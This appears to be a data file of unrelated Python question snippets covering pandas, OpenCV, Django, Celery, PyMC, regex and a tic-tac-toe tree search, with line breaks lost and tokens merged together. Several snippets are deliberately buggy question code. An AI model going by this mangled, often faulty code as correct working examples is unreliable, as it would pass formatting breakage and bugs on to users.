: woke up - returning result ' ) return [ 'sleeper ' , 'result ' ] def on_sleeper_result ( r ) : if isinstance ( r , Exception ) : info ( 'on_sleeper_result : got error : % s ' % r ) else : info ( 'on_sleeper_result : got result : % s ' % r ) from delegate import delegatedelegate ( sleeper , 3 ) .attach ( on_sleeper_result ) delegate ( sleeper , -3 ) .attach ( on_sleeper_result ) while 1 : info ( 'main : loop ' ) sleep ( 1 ) 0122 08432 MainThread INFO delegate : < function sleeper at 0x163e320 > ( 3 , ) 0123 08432 MainThread INFO delegate : < function sleeper at 0x163e320 > ( -3 , ) 0124 08437 MainThread INFO run : try running < function sleeper at 0x163e320 > 0124 08437 MainThread INFO sleeper : will go to sleep for 3 secs0124 08432 MainThread INFO main : loop0125 08438 MainThread INFO run : try running < function sleeper at 0x163e320 > 0126 08438 MainThread INFO run : leaving0126 08432 MainThread INFO on_callback : checking queue ... 0126 08432 MainThread INFO on_callback : got call - Call ( id='057649cba7d840e3825aa5ac73248f78 ' , finished=-1 , result=None , error=AssertionError ( ' I need my Augenpflege ' , ) ) 0127 08432 MainThread INFO on_sleeper_result : got error : I need my Augenpflege0127 08432 MainThread INFO main : loop1128 08432 MainThread INFO main : loop2129 08432 MainThread INFO main : loop3127 08437 MainThread INFO sleeper : woke up - returning result3128 08437 MainThread INFO run : leaving3128 08432 MainThread INFO on_callback : checking queue ... 3129 08432 MainThread INFO on_callback : got call - Call ( id='041420c6c83a489aa5c7409c662d4917 ' , finished=1 , result= [ 'sleeper ' , 'result ' ] , error=None ) 3129 08432 MainThread INFO on_sleeper_result : got result : [ 'sleeper ' , 'result ' ] 3129 08432 MainThread INFO main : loop4130 08432 MainThread INFO main : loop5132 08432 MainThread INFO main : loop ..."
"A B C D0 7 2 5 21 3 3 1 12 0 2 6 13 3 6 2 9 pd.DataFrame ( { n : df.T [ column ] .nlargest ( k ) .index.tolist ( ) for n , column in enumerate ( df.T ) } ) .T 0 1 20 A C B1 A B C2 C B D3 D B A 0 1 2 3 4 50 A 7 C 5 B 21 A 3 B 3 C 12 C 6 B 2 D 13 D 9 B 6 A 3"
"x = linspace ( 0 , Lx , Nx ) y = linspace ( 0 , Ly , Ny ) z = linspace ( 0 , Lz , Nz ) points= [ ] i0 , j0 , k0 = floor ( ( x0 , y0 , z0 ) /grid_spacing ) Nr = ( i0 , j0 , k0 ) /grid_spacing + 2for i in range ( i0-Nr , i0+Nr ) : for j in range ( j0-Nr , j0+Nr ) : for k in range ( k0-Nr , k0+Nr ) : if norm ( array ( [ i , j , k ] ) *grid_spacing - ( x0 , y0 , k0 ) ) < cutoff : points.append ( ( i , j , k ) )"
"class Tree : def __init__ ( self , value_ = None , children_ = None ) : self.value = value_ self.children = children_ t = Tree ( ) # ... fill tree ... for node in t : print ( node.value )"
xtrain.describe ( ) # everything ok herescalar = StandardScaler ( ) xtrain2 = scalar.fit_transform ( xtrain ) scalekey = scalar.fit ( xtrain ) xtrain2 = scalekey.transform ( xtrain )
"pydoc django.views.generic problem in django.views.generic - < class 'django.core.exceptions.ImproperlyConfigured ' > : Requested setting DEFAULT_INDEX_TABLESPACE , but settings are not configured . You must either define the environment variable DJANGO_SETTINGS_MODULE or call settings.configure ( ) before accessing settings"
"os.stat ( filename ) posix.stat_result ( st_mode=33184 , st_ino=131691855 , st_dev=16777220L , st_nlink=1 , st_uid=501 , st_gid=20 , st_size=174241 , st_atime=1445046864 , st_mtime=1445045836 , st_ctime=1445045836 )"
( [ 0-9A-F ] { 4 } ) 0000 0000 is flagged as invalid and filtered out .
o.method_a ( ) .method_b ( ) tmp = o.method_a ( ) try : tmp.method_b ( ) finally : tmp = None class B { public : void method_b ( ) ; } ; class A { public : std : :shared_ptr < B > method_a ( ) ; } ; A o ; o.method_a ( ) - > method_b ( ) ;
git config -- global merge.tool meldgit config -- global mergetool.meld.path c : /Progra~2/meld/bin/meld
"`` { } blabla ... { } '' .format ( x , y ) `` { } blabla ... { } '' % ( x , y )"
"import pymc as pmN = 100data = 10p = pm.Beta ( ' p ' , alpha=1.0 , beta=1.0 ) q = pm.Beta ( ' q ' , alpha=1.0 , beta=1.0 ) A = pm.Binomial ( ' A ' , N , p ) X = pm.Binomial ( ' x ' , A , q , observed=True , value=data ) mcmc = pm.MCMC ( model ) mcmc.sample ( iter=100000 , burn=50000 , thin=100 ) plot ( mcmc ) with pm.Model ( ) as model : N = 100 p = pm.Beta ( ' p ' , alpha=1.0 , beta=1.0 ) q = pm.Beta ( ' q ' , alpha=1.0 , beta=1.0 ) A = pm.Binomial ( ' A ' , N , p ) X = pm.Binomial ( ' x ' , A , q , observed=10 ) with model : start = pm.find_MAP ( ) with model : step = pm.NUTS ( ) trace = pm.sample ( 3000 , step , start ) pm.traceplot ( trace )"
"def morris ( x ) : a = [ ' 1 ' , '11 ' ] yield a [ 0 ] yield a [ 1 ] while len ( a ) < = x : s = `` count = 1 al = a [ -1 ] for i in range ( 0 , len ( al ) ) : if i+1 < len ( al ) and al [ i ] == al [ i+1 ] : count += 1 else : s += ' % s % s ' % ( count , al [ i ] ) count = 1 a.append ( s ) yield sa = [ i for i in morris ( 30 ) ]"
cdef int [ : ] array_test ( double *x ) nogil cdef inline int [ : ] array_test ( double *x ) nogil : cdef int output [ 2 ] output [ 0 ] =1 output [ 1 ] =9 return output
"chess_data = pd.DataFrame ( { `` winner '' : [ ' A:1 ' , ' A:2 ' , ' A:3 ' , ' A:4 ' , ' B:1 ' , ' B:2 ' ] } ) chess_data.winner.str.split ( `` : '' ) [ 0 ] [ ' A ' , ' 1 ' ] chess_data.winner.map ( lambda n : n.split ( `` : '' ) [ 0 ] ) 0 A1 A2 A3 A4 B5 BName : winner , dtype : object"
"< div class= '' container '' > < form method= '' POST '' action= '' /convert '' enctype= '' multipart/form-data '' > < div class= '' form-group '' > < br / > < input type= '' file '' name= '' file '' > < input type= '' submit '' name= '' upload '' / > < /div > < /form > < /div > @ app.route ( '/convert ' , methods= [ `` POST '' ] ) def convert ( if request.method == 'POST ' : # Read uploaded file to df input_csv_f = request.files [ 'file ' ] input_df = pd.read_csv ( input_csv_f ) # TODO : Add progress bar for pd_convert result_df = pd_convert ( input_df ) if result_df is not None : resp = make_response ( result_df.to_csv ( ) ) resp.headers [ `` Content-Disposition '' ] = `` attachment ; filename=export.csv '' resp.headers [ `` Content-Type '' ] = `` text/csv '' return resp @ app.route ( '/progress ' ) def progress ( ) : `` '' '' Get percentage progress for the dataframe process '' '' '' r = redis.StrictRedis ( host=redis_host , port=redis_port , password=redis_password , decode_responses=True ) r.set ( `` progress '' , str ( 0 ) ) # TODO : Problem , 2nd submit does n't clear progress to 0 % . How to make independent progress for each client and clear to 0 % on each submit def get_progress ( ) : p = int ( r.get ( `` progress '' ) ) while p < = 100 : p = int ( r.get ( `` progress '' ) ) p_msg = `` data : '' + str ( p ) + `` \n\n '' yield p_msg logging.info ( p_msg ) if p == 100 : r.set ( `` progress '' , str ( 0 ) ) time.sleep ( 1 ) return Response ( get_progress ( ) , mimetype='text/event-stream ' )"
"clahe = cv2.createCLAHE ( clipLimit=100.0 , tileGridSize= ( 100,100 ) ) self.cl1 = clahe.apply ( self.result_array ) self.cl1 = 255 - self.cl1 self.ret , self.thresh = cv2.threshold ( self.cl1 , 0,255 , cv2.THRESH_BINARY + cv2.THRESH_OTSU ) kernel = np.ones ( ( 1,1 ) , np.float32 ) /1 self.thresh = cv2.erode ( self.thresh , kernel , iterations=3 ) self.thresh = cv2.dilate ( self.thresh , kernel , iterations=3 )"
"> > > import csv > > > writer = csv.writer ( open ( 'outfile.csv ' , ' w ' ) ) > > > type ( writer ) < class '_csv.writer ' > > > > import _csv > > > writer : _csv.writer = csv.writer ( open ( 'outfile.csv ' , ' w ' ) ) Invalid type `` _csv.writer ''"
"import pandas as pdimport numpy as npdf = pd.DataFrame ( { 'text ' : [ 'abc def ' , 'abc ghi ' , np.nan ] } ) from sklearn.impute import SimpleImputerimp = SimpleImputer ( strategy='constant ' ) from sklearn.feature_extraction.text import CountVectorizervect = CountVectorizer ( ) from sklearn.pipeline import make_pipelinepipe = make_pipeline ( imp , vect ) pipe.fit_transform ( df [ [ 'text ' ] ] ) .toarray ( ) AttributeError : 'numpy.ndarray ' object has no attribute 'lower '"
"im = cv2.blur ( im , ( 5 , 5 ) ) plt.imshow ( im , 'gray ' ) ret , thresh = cv2.threshold ( im , 250 , 255 , 0 ) plt.imshow ( ~thresh , 'gray ' ) horizontal = cv2.morphologyEx ( ~thresh , cv2.MORPH_OPEN , cv2.getStructuringElement ( cv2.MORPH_RECT , ( 100 , 1 ) ) , ) plt.imshow ( horizontal , 'gray ' ) plt.imshow ( horizontal ^ ~thresh , 'gray ' ) ret , thresh2 = cv2.threshold ( roi , 127 , 255 , 0 ) vertical = cv2.morphologyEx ( ~thresh2 , cv2.MORPH_OPEN , cv2.getStructuringElement ( cv2.MORPH_RECT , ( 2 , 15 ) ) , iterations=2 ) vertical = cv2.morphologyEx ( ~vertical , cv2.MORPH_ERODE , cv2.getStructuringElement ( cv2.MORPH_RECT , ( 9 , 9 ) ) ) horizontal = cv2.morphologyEx ( ~horizontal , cv2.MORPH_ERODE , cv2.getStructuringElement ( cv2.MORPH_RECT , ( 7 , 7 ) ) ) plt.imshow ( vertical & horizontal , 'gray ' ) plt.imshow ( horizontal & vertical & ~thresh , 'gray ' ) plt.imshow ( cv2.morphologyEx ( im2 , cv2.MORPH_CLOSE , cv2.getStructuringElement ( cv2.MORPH_ELLIPSE , ( 5 , 5 ) ) ) , 'gray ' )"
"from abc import ABCfrom sqlalchemy import Column , Integer , create_enginefrom sqlalchemy.ext.declarative import declarative_basefrom sqlalchemy.orm import sessionmakerclass BaseAbstract ( ABC ) : `` '' '' description of class '' '' '' SQLALCHEMY_DATABASE_URI =\ 'mssql+pyodbc : // ( local ) /TestDB ? driver=SQL+Server+Native+Client+11.0'SQLALCHEMY_TRACK_MODIFICATIONS = Falseengine = create_engine ( SQLALCHEMY_DATABASE_URI , echo=True ) Session = sessionmaker ( bind=engine ) session = Session ( ) Base = declarative_base ( ) metadata = Base.metadataclass Mytable ( Base , BaseAbstract ) : __tablename__ = 'myTable ' id = Column ( Integer , primary_key=True ) firstNum = Column ( Integer , nullable=False ) secondNum = Column ( Integer , nullable=False )"
"import matplotlib.pyplot as pltdef on_key_press ( event ) : if event.key == `` left '' : print ( `` Left ! '' ) elif event.key == `` right '' : print ( `` Right ! `` ) plt.plot ( [ 0 , 1 , 2 , 3 , 4 ] , [ 5 , 2 , 1 , 2 , 5 ] ) plt.gcf ( ) .canvas.mpl_connect ( `` key_press_event '' , on_key_press )"
"mainwindow ( ) - > % % Create new environment X = wx : new ( ) , % % Create the main frame MainFrame = wxFrame : new ( X , -1 , `` Test '' ) , MainPanel = wxPanel : new ( MainFrame , [ { winid , ? wxID_ANY } ] ) , MainSizer = wxBoxSizer : new ( ? wxHORIZONTAL ) , wxWindow : setSizer ( MainPanel , MainSizer ) , % % Left Panel ... LeftPanel = wxPanel : new ( MainPanel , [ { winid , ? wxID_ANY } ] ) , LeftPanelSizer = wxBoxSizer : new ( ? wxVERTICAL ) , wxWindow : setSizer ( LeftPanel , LeftPanelSizer ) , wxWindow : setMinSize ( LeftPanel , { 152 , -1 } ) , % % Right Panel RightPanel = wxPanel : new ( MainPanel , [ { winid , ? wxID_ANY } ] ) , RightPanelVerticalSizer = wxBoxSizer : new ( ? wxVERTICAL ) , RightPanelHorizontalSizer = wxBoxSizer : new ( ? wxHORIZONTAL ) , wxWindow : setBackgroundColour ( RightPanel , { 255,0,0 } ) , Notebook = wxNotebook : new ( RightPanel , ? wxID_ANY , [ { size , { -1 , -1 } } ] ) , TestPanel1 = wxPanel : new ( Notebook , [ { size , { -1 , -1 } } , { winid , ? wxID_ANY } ] ) , wxNotebook : addPage ( Notebook , TestPanel1 , `` Testpanel ! `` ) , TestPanel2 = wxPanel : new ( Notebook , [ { size , { -1 , -1 } } , { winid , ? wxID_ANY } ] ) , wxNotebook : addPage ( Notebook , TestPanel2 , `` Testpanel ! `` ) , wxSizer : add ( RightPanelVerticalSizer , Notebook , [ { border,0 } , { proportion,1 } , { flag , ? wxEXPAND } ] ) , wxSizer : add ( RightPanelHorizontalSizer , RightPanelVerticalSizer , [ { proportion,1 } , { flag , ? wxEXPAND } ] ) , wxWindow : setSizer ( RightPanel , RightPanelHorizontalSizer ) , % % Main Sizer wxSizer : add ( MainSizer , LeftPanel , [ { border , 2 } , { flag , ? wxEXPAND bor ? wxALL } ] ) , wxSizer : add ( MainSizer , RightPanel , [ { border , 2 } , { flag , ? wxEXPAND bor ? wxTOP bor ? wxRIGHT bor ? wxBOTTOM } ] ) , % % Connect to events wxFrame : connect ( MainFrame , close_window ) , wxWindow : center ( MainFrame ) , wxWindow : show ( MainFrame ) , ..."
"import remyText = 'sgasgAAAaoasgosaegnsBBBausgisego'myRegex = re.compile ( ' ( ? P < short > ( ? : AAA ) ) | ( ? P < long > ( ? : AAA . *BBB ) ) ' ) x = re.findall ( myRegex , myText ) print ( x ) [ ( 'AAA ' , `` ) ] for g in myRegex.groupindex.keys ( ) : match = re.findall ( ***regex_for_named_group_g*** , myText ) { 'short ' : 'AAA ' , 'long ' : 'AAAaoasgosaegnsBBB ' }"
"Given 3 int values , a b c , return their sum . However , if one of the values is the same as another of the values , it does not count towards the sum . lone_sum ( 1 , 2 , 3 ) → 6lone_sum ( 3 , 2 , 3 ) → 2lone_sum ( 3 , 3 , 3 ) → 0 def lone_sum ( a , b , c ) : sum = a+b+c if a == b : if a == c : sum -= 3 * a else : sum -= 2 * a elif b == c : sum -= 2 * b elif a == c : sum -= 2 * a return sum"
"from numba import jit @ jitdef sum ( x , y ) : return x + y"
"CELERYBEAT_SCHEDULE = { 'poll_actions ' : { 'task ' : 'tasks.poll_actions ' , 'schedule ' : timedelta ( seconds=5 ) } } @ celery.taskdef run ( ids ) : group ( prepare.s ( id ) for id in ids ) | execute.s ( ids ) | poll.s ( ids , schedule=timedelta ( seconds=5 ) ) @ celery.taskdef prepare ( id ) : ... @ celery.taskdef execute ( id ) : ... @ celery.taskdef poll ( ids ) : # This task has to be schedulable on demand ..."
"def get_factors ( n ) : i = int ( n**0.5 + 0.5 ) while n % i ! = 0 : i -= 1 return i , n/i"
# -*- coding : utf-8 -*-from __future__ import unicode_literalsclass SomeClass ( object ) : pass # -*- coding : utf-8 -*-from __future__ import unicode_literalsfrom .somemodule import SomeClass__all__ = [ 'SomeClass ' ] # -*- coding : utf-8 -*-from __future__ import print_functionfrom __future__ import unicode_literalsfrom mypackage import *print ( 'yay ' ) __all__ = [ str ( 'SomeClass ' ) ] # pylint : disable=invalid-all-object
"from injector import Injector , injectclass Inner ( object ) : def __init__ ( self ) : self.foo = 'foo'class Outer ( object ) : @ inject ( inner=Inner ) def __init__ ( self , inner=None ) : if inner is None : print ( 'inner not provided ' ) self.inner = Inner ( ) else : print ( 'inner provided ' ) self.inner = innerinjector = Injector ( ) outer = Outer ( ) print ( outer.inner.foo ) outer = injector.get ( Outer ) print ( outer.inner.foo )"
"sns.distplot ( df.X , bins=25 , hist_kws= { 'weights ' : df.W.values } , norm_hist=False , kde=False )"
"from django.conf.urls import include , urlfrom foo import urls as foo_urlsurlpatterns = [ url ( r'^api/ ' , include ( 'api.urls ' , namespace='api ' ) ) , url ( r'^ . */ $ ' , include ( foo_urls ) ) , ] from django.conf.urls import include , urlfrom foo import viewsurlpatterns = [ url ( r ' a $ ' , views.a ) , ]"
"import numpy as npimport scipy.optimize as scdata = np.array ( [ [ 1,2,3,4,5,6,7 ] , [ 1.1,1.9,3.2,4.3,4.8,6.0,7.3 ] ] ) .Tx=data [ : ,0 ] y=data [ : ,1 ] A=np.polyfit ( x , y,1 , cov=True ) print ( 'Polyfit : ' , np.diag ( A [ 1 ] ) ) B=sc.curve_fit ( lambda x , a , b : a*x+b , x , y ) print ( 'Curve_Fit : ' , np.diag ( B [ 1 ] ) )"
python-3.5.4-amd64.exe /passive PrependPath=1
"OUTPUT = `` '' '' { { 172.25.50.10:01:01-Ethernet 172.25.50.10:01:02-Ethernet { Traffic Item 1 } } } { { 172.25.50.10:01:02-Ethernet 172.25.50.10:01:01-Ethernet { Traffic Item 1 } } } '' '' '' OUTPUT = [ `` '' '' { { 172.25.50.10:01:01-Ethernet 172.25.50.10:01:02-Ethernet { Traffic Item 1 } } } '' '' '' , `` '' '' { { 172.25.50.10:01:02-Ethernet 172.25.50.10:01:01-Ethernet { Traffic Item 1 } } } '' '' '' ] import resplitter = re.compile ( ' } } \s+ { { ' ) splitter.split ( OUTPUT ) [ ' { { 172.25.50.10:01:01-Ethernet 172.25.50.10:01:02-Ethernet { Traffic Item 1 } ' , '172.25.50.10:01:02-Ethernet 172.25.50.10:01:01-Ethernet { Traffic Item 1 } } } ' ]"
"> > > pow ( 10,25 ) % 19510L > > > pow ( 10,25.0 ) % 19564.0"
"f = open ( `` test.txt '' , '' w+ '' )"
"import arghdef func ( foo=1 , bar=True ) : `` '' '' Sample function . Parameters : foo : float An example argument . bar : bool Another argument. `` '' '' print foo , barargh.dispatch_command ( func , argv= [ '-h ' ] ) usage : script.py [ -h ] [ -f FOO ] [ -b ] Sample function . Parameters : foo : float An example argument . bar : bool Anotherargument.optional arguments : -h , -- help show this help message and exit -f FOO , -- foo FOO -b , -- bar usage : script.py [ -h ] [ -f FOO ] [ -b ] Sample function . Parameters : foo : float An example argument . bar : bool Another argument.optional arguments : -h , -- help show this help message and exit -f FOO , -- foo FOO -b , -- bar"
"# models.pyfrom django.contrib.gis.db import modelsclass Place ( models.Model ) : name = models.CharField ( max_length=255 ) location = models.PointField ( blank=True , null=True ) objects = models.GeoManager ( ) def __str__ ( self ) : return `` % s '' % self.name # factories.pyimport factoryfrom faker import Factory as FakerFactoryfrom . import modelsfaker = FakerFactory.create ( ) class PlaceFactory ( factory.django.DjangoModelFactory ) : class Meta : model = models.Place name = factory.LazyAttribute ( lambda x : faker.name ( ) ) # location = What do I do ?"
echo beforeif `` '' == `` '' ( echo first if exit /b 1 if `` '' == `` '' ( echo second if ) ) echo after python -c `` from subprocess import Popen as po ; print 'exit status : % d ' % po ( [ 'bug.cmd ' ] ) .wait ( ) '' echo beforebeforeif `` '' == `` '' ( echo first if exit /b 1 if `` '' == `` '' ( echo second if ) ) first ifexit status : 0 echo beforeif `` '' == `` '' ( echo first if exit /b 1 ) echo after python -c `` from subprocess import Popen as po ; print 'exit status : % d ' % po ( [ 'ok.cmd ' ] ) .wait ( ) '' echo beforebefore ( environment ) F : \pf\mm_3.0.1\RendezVous\Services\Matchmaking > if `` '' == `` '' ( echo first if exit /b 1 ) first ifexit status : 1
"> > > class A ( object ) : def __del__ ( self ) : print ( `` DEL '' ) def a ( self ) : pass > > > a = A ( ) > > > del aDEL > > > a = A ( ) > > > a.a = a.a > > > del a > > > a = A ( ) > > > print a.a < bound method A.a of < __main__.A object at 0xe86110 > > > > > a.a = a.a > > > print a.a < bound method A.a of < __main__.A object at 0xe86110 > > > > > b = A ( ) > > > import objgraph > > > objgraph.show_backrefs ( [ b ] , filename='pre-backref-graph.png ' ) > > > b.a = b.a > > > objgraph.show_backrefs ( [ b ] , filename='post-backref-graph.png ' )"
print tvdbinstance [ 1 ] [ 23 ] [ 'episodename ' ] # get the name of episode 23 of season 1
"from django.db import modelsfrom django.db.models.signals import pre_save # Create your models here.class Parent ( models.Model ) : name = models.CharField ( max_length=64 ) def save ( self , **kwargs ) : print `` Parent save ... '' super ( Parent , self ) .save ( **kwargs ) def pre_save_parent ( **kwargs ) : print `` pre_save_parent '' pre_save.connect ( pre_save_parent , Parent ) class Child ( Parent ) : color = models.CharField ( max_length=64 ) def save ( self , **kwargs ) : print `` Child save ... '' super ( Child , self ) .save ( **kwargs ) def pre_save_child ( **kwargs ) : print `` pre_save_child '' pre_save.connect ( pre_save_child , Child ) child = models.Child.objects.create ( color= '' red '' )"
Out [ 178 ] : group value0 A a1 A b2 A c3 A d4 B c5 C d6 C e7 C a Out [ 180 ] : group 0 10 A a b1 A a c2 A a d3 A b c4 A b d5 A c d0 C d e1 C d a2 C e a
"Welcome to Ubuntu 14.04.5 LTS ( GNU/Linux 3.13.0-91-generic x86_64 ) ~ $ python3 -- versionPython 3.5.2~ $ python3 -c 'import cassandra ; print ( cassandra.__version__ ) ' 3.7.0~ $ python3 cassandra_loader.pyTraceback ( most recent call last ) : File `` cassandra_loader.py '' , line 7 , in from cassandra_tools import transform_record , QueryManager File `` ../lib/cassandra_tools.py '' , line 6 , in from cassandra.cluster import Cluster ImportError : /usr/local/lib/python3.5/site-packages/cassandra/cluster.cpython-35m-x86_64-linux-gnu.so : undefined symbol : PyException_Check"
"# bitwise right binary shift functiondef rshift ( val , n ) : return ( val % 0x100000000 ) base_img = cv2.imread ( 'img1.jpg ' ) cur_img = cv2.imread ( 'dataa//t_sv_1.jpg ' ) curr_img = rotateImage ( cur_img , 90 ) rows , cols , chan = base_img.shapex , y , c = curr_img.shape # convert images to valid typeref32 = np.float32 ( cv2.cvtColor ( base_img , cv2.COLOR_BGR2GRAY ) ) curr32 = np.float32 ( cv2.cvtColor ( curr_img , cv2.COLOR_BGR2GRAY ) ) value = np.sqrt ( ( ( rows/2.0 ) **2.0 ) + ( ( cols/2.0 ) **2.0 ) ) value2 = np.sqrt ( ( ( x/2.0 ) **2.0 ) + ( ( y/2.0 ) **2.0 ) ) polar_image = cv2.linearPolar ( ref32 , ( rows/2 , cols/2 ) , value , cv2.WARP_FILL_OUTLIERS ) log_img = cv2.linearPolar ( curr32 , ( x/2 , y/2 ) , value2 , cv2.WARP_FILL_OUTLIERS ) shift = cv2.phaseCorrelate ( polar_image , log_img ) sx = shift [ 0 ] [ 0 ] sy = shift [ 0 ] [ 1 ] sf = shift [ 1 ] polar_image = polar_image.astype ( np.uint8 ) log_img = log_img.astype ( np.uint8 ) cv2.imshow ( `` Polar Image '' , polar_image ) cv2.imshow ( 'polar ' , log_img ) # get rotation from shift along y axisrotation = sy * 180 / ( rshift ( y , 1 ) ) ; print ( rotation ) cv2.waitKey ( 0 ) cv2.destroyAllWindows ( ) Output : -0.00717516014538333"
> > > i = 123 > > > type ( i ) < class 'int ' > > > > i = `` 123 '' > > > type ( i ) < class 'str ' >
"# ! /usr/bin/env python3 # -*- coding : utf-8 -*- # from my_preprocessor import my_procproc = my_proc ( ) proc.run ( ) # # Test documentation build configuration file , created by # sphinx-quickstart on Tue May 24 11:28:20 2016. # ... ."
"from math import log , sqrtimport randomimport numpy as npfrom copy import deepcopyclass BigGameState : def __init__ ( self ) : self.board = np.zeros ( ( 10 , 10 ) , dtype= '' int8 '' ) self.curr = 1 self.playerJustMoved = 2 # At the root pretend the player just moved is player 2 - player 1 has the first move def Clone ( self ) : `` '' '' Create a deep clone of this game state. `` '' '' st = BigGameState ( ) st.playerJustMoved = self.playerJustMoved st.curr = self.curr st.board = deepcopy ( self.board ) return st def DoMove ( self , move ) : `` '' '' Update a state by carrying out the given move . Must update playerJustMoved. `` '' '' self.playerJustMoved = 3 - self.playerJustMoved if move > = 1 and move < = 9 and move == int ( move ) and self.board [ self.curr ] [ move ] == 0 : self.board [ self.curr ] [ move ] = self.playerJustMoved self.curr = move def GetMoves ( self ) : `` '' '' Get all possible moves from this state. `` '' '' return [ i for i in range ( 1 , 10 ) if self.board [ self.curr ] [ i ] == 0 ] def GetResult ( self , playerjm ) : `` '' '' Get the game result from the viewpoint of playerjm. `` '' '' for bo in self.board : for ( x , y , z ) in [ ( 1,2,3 ) , ( 4,5,6 ) , ( 7,8,9 ) , ( 1,4,7 ) , ( 2,5,8 ) , ( 3,6,9 ) , ( 1,5,9 ) , ( 3,5,7 ) ] : if bo [ x ] == [ y ] == bo [ z ] : if bo [ x ] == playerjm : return 1.0 else : return 0.0 if self.GetMoves ( ) == [ ] : return 0.5 # draw def drawboard ( self ) : print_board_row ( self.board , 1 , 2 , 3 , 1 , 2 , 3 ) print_board_row ( self.board , 1 , 2 , 3 , 4 , 5 , 6 ) print_board_row ( self.board , 1 , 2 , 3 , 7 , 8 , 9 ) print ( `` -- -- -- + -- -- -- -+ -- -- -- '' ) print_board_row ( self.board , 4 , 5 , 6 , 1 , 2 , 3 ) print_board_row ( self.board , 4 , 5 , 6 , 4 , 5 , 6 ) print_board_row ( self.board , 4 , 5 , 6 , 7 , 8 , 9 ) print ( `` -- -- -- + -- -- -- -+ -- -- -- '' ) print_board_row ( self.board , 7 , 8 , 9 , 1 , 2 , 3 ) print_board_row ( self.board , 7 , 8 , 9 , 4 , 5 , 6 ) print_board_row ( self.board , 7 , 8 , 9 , 7 , 8 , 9 ) print ( ) def print_board_row ( board , a , b , c , i , j , k ) : # The marking script does n't seem to like this either , so just take it out to submit print ( `` '' , board [ a ] [ i ] , board [ a ] [ j ] , board [ a ] [ k ] , end = `` | `` ) print ( board [ b ] [ i ] , board [ b ] [ j ] , board [ b ] [ k ] , end = `` | `` ) print ( board [ c ] [ i ] , board [ c ] [ j ] , board [ c ] [ k ] ) class Node : `` '' '' A node in the game tree . Note wins is always from the viewpoint of playerJustMoved . Crashes if state not specified. `` '' '' def __init__ ( self , move = None , parent = None , state = None ) : self.move = move # the move that got us to this node - `` None '' for the root node self.parentNode = parent # `` None '' for the root node self.childNodes = [ ] self.wins = 0 self.visits = 0 self.untriedMoves = state.GetMoves ( ) # future child nodes self.playerJustMoved = state.playerJustMoved # the only part of the state that the Node needs later def UCTSelectChild ( self ) : `` '' '' Use the UCB1 formula to select a child node . Often a constant UCTK is applied so we have lambda c : c.wins/c.visits + UCTK * sqrt ( 2*log ( self.visits ) /c.visits to vary the amount of exploration versus exploitation. `` '' '' s = sorted ( self.childNodes , key = lambda c : c.wins/c.visits + 0.2 * sqrt ( 2*log ( self.visits ) /c.visits ) ) [ -1 ] return s def AddChild ( self , m , s ) : `` '' '' Remove m from untriedMoves and add a new child node for this move . Return the added child node `` '' '' n = Node ( move = m , parent = self , state = s ) self.untriedMoves.remove ( m ) self.childNodes.append ( n ) return n def Update ( self , result ) : `` '' '' Update this node - one additional visit and result additional wins . result must be from the viewpoint of playerJustmoved. `` '' '' self.visits += 1 self.wins += result def __repr__ ( self ) : return `` [ M : '' + str ( self.move ) + `` W/V : '' + str ( self.wins ) + `` / '' + str ( self.visits ) + `` U : '' + str ( self.untriedMoves ) + `` ] '' def TreeToString ( self , indent ) : s = self.IndentString ( indent ) + str ( self ) for c in self.childNodes : s += c.TreeToString ( indent+1 ) return s def IndentString ( self , indent ) : s = `` \n '' for i in range ( 1 , indent+1 ) : s += `` | `` return s def ChildrenToString ( self ) : s = `` '' for c in self.childNodes : s += str ( c ) + `` \n '' return sdef UCT ( rootstate , itermax , verbose = False ) : `` '' '' Conduct a UCT search for itermax iterations starting from rootstate . Return the best move from the rootstate . Assumes 2 alternating players ( player 1 starts ) , with game results in the range [ 0.0 , 1.0 ] . '' '' '' rootnode = Node ( state = rootstate ) for i in range ( itermax ) : node = rootnode state = rootstate.Clone ( ) # Select while node.untriedMoves == [ ] and node.childNodes ! = [ ] : # node is fully expanded and non-terminal node = node.UCTSelectChild ( ) state.DoMove ( node.move ) # Expand if node.untriedMoves ! = [ ] : # if we can expand ( i.e . state/node is non-terminal ) m = random.choice ( node.untriedMoves ) state.DoMove ( m ) node = node.AddChild ( m , state ) # add child and descend tree # Rollout - this can often be made orders of magnitude quicker using a state.GetRandomMove ( ) function while state.GetMoves ( ) ! = [ ] : # while state is non-terminal state.DoMove ( random.choice ( state.GetMoves ( ) ) ) # Backpropagate while node ! = None : # backpropagate from the expanded node and work back to the root node node.Update ( state.GetResult ( node.playerJustMoved ) ) # state is terminal . Update node with result from POV of node.playerJustMoved node = node.parentNode # Output some information about the tree - can be omitted if ( verbose ) : print ( rootnode.TreeToString ( 0 ) ) else : print ( rootnode.ChildrenToString ( ) ) return sorted ( rootnode.childNodes , key = lambda c : c.visits ) [ -1 ] .move # return the move that was most visiteddef UCTPlayGame ( ) : `` '' '' Play a sample game between two UCT players where each player gets a different number of UCT iterations ( = simulations = tree nodes ) . `` '' '' state = BigGameState ( ) # uncomment to play OXO while ( state.GetMoves ( ) ! = [ ] ) : state.drawboard ( ) m = UCT ( rootstate = state , itermax = 1000 , verbose = False ) # play with values for itermax and verbose = True print ( `` Best Move : `` + str ( m ) + `` \n '' ) state.DoMove ( m ) if state.GetResult ( state.playerJustMoved ) == 1.0 : print ( `` Player `` + str ( state.playerJustMoved ) + `` wins ! '' ) elif state.GetResult ( state.playerJustMoved ) == 0.0 : print ( `` Player `` + str ( 3 - state.playerJustMoved ) + `` wins ! '' ) else : print ( `` Nobody wins ! `` ) if __name__ == `` __main__ '' : `` '' '' Play a single game to the end using UCT for both players. `` '' '' UCTPlayGame ( ) -- O| -- -| -- -- O-| -- -| -- -- -- | -- -| -- -- -- -- -- -- -- -- -|-O-| -- -- -- |-O-| -- -- -- | -- -| -- -- -- -- -- -- -- -- -| -- -| -- -- -- | -- -| -- -- -- | -- -| -- -"
for segment in data.continuous_segments ( ) : # Process each segment
